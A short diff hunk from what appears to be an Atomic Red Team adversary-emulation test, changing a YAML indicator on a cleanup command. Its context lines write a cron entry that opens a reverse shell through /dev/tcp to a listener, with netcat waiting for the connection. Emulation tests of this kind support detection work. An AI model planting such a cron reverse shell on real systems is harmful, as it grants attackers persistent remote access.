@@ -139,7 +139,7 @@ atomic_tests:
       echo -n "$" >> #{mount_point}#{cron_path}/#{cron_filename}
       echo "(id)\" >& /dev/tcp/#{listen_address}/#{listen_port} 0>&1'" >> #{mount_point}#{cron_path}/#{cron_filename}
       netcat -l -p #{listen_port} 2>&1
-    cleanup_command: |
+    cleanup_command: |-
       rm #{mount_point}#{cron_path}/#{cron_filename}
       umount #{mount_point}
       rmdir #{mount_point}
